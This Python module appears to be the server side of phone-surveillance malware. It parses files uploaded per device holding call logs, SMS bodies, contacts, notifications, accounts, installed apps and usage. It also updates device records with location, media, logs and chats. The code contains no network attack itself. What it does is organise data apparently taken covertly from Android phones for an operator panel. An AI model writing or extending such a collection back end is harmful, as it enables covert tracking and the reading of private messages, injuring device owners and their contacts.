import os
import json
import time
from config import BLACKLIST
from core.database import database, save_db

def get_and_parse_cloud_data(device_id, category):
    file_path = os.path.join("data", device_id, f"{category}.txt")
    if not os.path.exists(file_path):
        return None
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        parsed_list = []
        if category == "calls":
            contacts_list = get_and_parse_cloud_data(device_id, "contacts") or []
            contact_map = {}
            for c in contacts_list:
                c_num = c.get('number')
                c_name = c.get('name')
                if c_num and c_name:
                    norm = "".join(ch for ch in str(c_num) if ch.isdigit())[-10:]
                    if norm:
                        contact_map[norm] = c_name

            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':', 1)[0].strip(): x.split(':', 1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Num' in p:
                        num = p['Num']
                        norm_num = "".join(ch for ch in str(num) if ch.isdigit())[-10:]
                        name = contact_map.get(norm_num, "")
                        parsed_list.append({
                            'number': num,
                            'name': name,
                            'duration': p.get('Dur', '0s'),
                            'type': p.get('Type', ''),
                            'date': p.get('Date', '')
                        })
            parsed_list.sort(key=lambda x: x.get('date', ''), reverse=True)
        elif category == "sms":
            contacts_list = get_and_parse_cloud_data(device_id, "contacts") or []
            contact_map = {}
            for c in contacts_list:
                c_num = c.get('number')
                c_name = c.get('name')
                if c_num and c_name:
                    norm = "".join(ch for ch in str(c_num) if ch.isdigit())[-10:]
                    if norm:
                        contact_map[norm] = c_name

            for chunk in content.split('---'):
                if '|' in chunk:
                    p = {x.split(':', 1)[0].strip(): x.split(':', 1)[1].strip() for x in chunk.split('|') if ':' in x}
                    if 'From' in p:
                        from_num = p['From']
                        norm_num = "".join(ch for ch in str(from_num) if ch.isdigit())[-10:]
                        name = contact_map.get(norm_num, "")
                        address = f"{name} ({from_num})" if name else from_num
                        parsed_list.append({
                            'address': address,
                            'body': p.get('Msg', ''),
                            'type': p.get('Type', ''),
                            'date': p.get('Date', '')
                        })
            parsed_list.sort(key=lambda x: x.get('date', ''), reverse=True)
        elif category == "apps":
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':', 1)[0].strip(): x.split(':', 1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Pkg' in p:
                        parsed_list.append({'name': p.get('Name', 'Unknown'), 'package': p['Pkg']})
        elif category == "contacts":
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':', 1)[0].strip(): x.split(':', 1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Num' in p:
                        parsed_list.append({'name': p.get('Name', 'Unknown'), 'number': p['Num']})
        elif category == "accounts":
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':', 1)[0].strip(): x.split(':', 1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Name' in p:
                        parsed_list.append({'type': p.get('Type', ''), 'name': p['Name']})
        elif category == "notifications":
            for chunk in content.split('---'):
                if '|' in chunk:
                    p = {x.split(':', 1)[0].strip(): x.split(':', 1)[1].strip() for x in chunk.split('|') if ':' in x}
                    if 'App' in p:
                        parsed_list.append({
                            'app': p['App'],
                            'title': p.get('Title', ''),
                            'text': p.get('Msg', ''),
                            'time': p.get('Time', '')
                        })
        elif "usage" in category:
            for line in content.split('\n'):
                if '|' in line:
                    p = {x.split(':', 1)[0].strip(): x.split(':', 1)[1].strip() for x in line.split('|') if ':' in x}
                    if 'Name' in p:
                        parsed_list.append({
                            'name': p['Name'],
                            'package': p.get('Pkg', ''),
                            'usage': p.get('Usage', ''),
                            'ms': int(p.get('MS', '0'))
                        })
        elif category == "files":
            try:
                return json.loads(content)
            except Exception:
                return []
        return parsed_list
    except Exception:
        return None

def update_device_record(device_id, category, data):
    if not device_id or device_id.lower() in BLACKLIST:
        return
    if device_id not in database:
        database[device_id] = {}

    if "_id" not in database[device_id]: database[device_id]["_id"] = device_id
    if "lastSeen" not in database[device_id]: database[device_id]["lastSeen"] = int(time.time() * 1000)
    if "info" not in database[device_id]: database[device_id]["info"] = {}
    if "refs" not in database[device_id]: database[device_id]["refs"] = {}
    if "media" not in database[device_id]: database[device_id]["media"] = {}
    if "logs" not in database[device_id]: database[device_id]["logs"] = []
    if "chats" not in database[device_id]: database[device_id]["chats"] = {}

    database[device_id]["lastSeen"] = int(time.time() * 1000)

    if category == "info" and isinstance(data, str):
        info = {}
        for line in data.split('\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                info[k.strip().lower()] = v.strip()
        database[device_id]["info"].update(info)
    elif category == "location" and isinstance(data, dict):
        if "location" not in database[device_id]: database[device_id]["location"] = {}
        database[device_id]["location"].update(data)
    elif category == "logs":
        database[device_id]["logs"].append({"text": str(data), "time": int(time.time() * 1000)})
        database[device_id]["logs"] = database[device_id]["logs"][-100:]
    elif category == "media" and isinstance(data, dict):
        if "media" not in database[device_id]: database[device_id]["media"] = {}
        database[device_id]["media"].update(data)
    save_db()
